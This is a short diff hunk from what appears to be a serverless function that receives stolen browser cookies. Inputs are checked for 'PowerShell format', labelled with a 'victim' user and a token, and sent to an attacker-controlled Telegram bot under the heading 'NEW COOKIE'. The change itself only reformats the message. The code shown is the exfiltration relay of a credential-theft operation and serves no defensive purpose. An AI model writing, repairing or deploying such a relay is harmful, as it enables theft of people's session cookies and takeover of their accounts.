@@ -84,7 +84,7 @@ exports.handler = async (event) => {
             return { statusCode: 400, body: JSON.stringify({ error: 'Invalid PowerShell format' }) };
         }
 
-        const message = `<b>⚠️⚠️⚠️NEW COOKIE</b>\n<b>👤User:</b> ${victim}\n\n<code>${token}</code>`;
+        const message = `<b>⚠️⚠️⚠️NEW COOKIE</b>\n<b>👤User: ${victim}</b>\n\n<code>${token}</code>`;
         const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
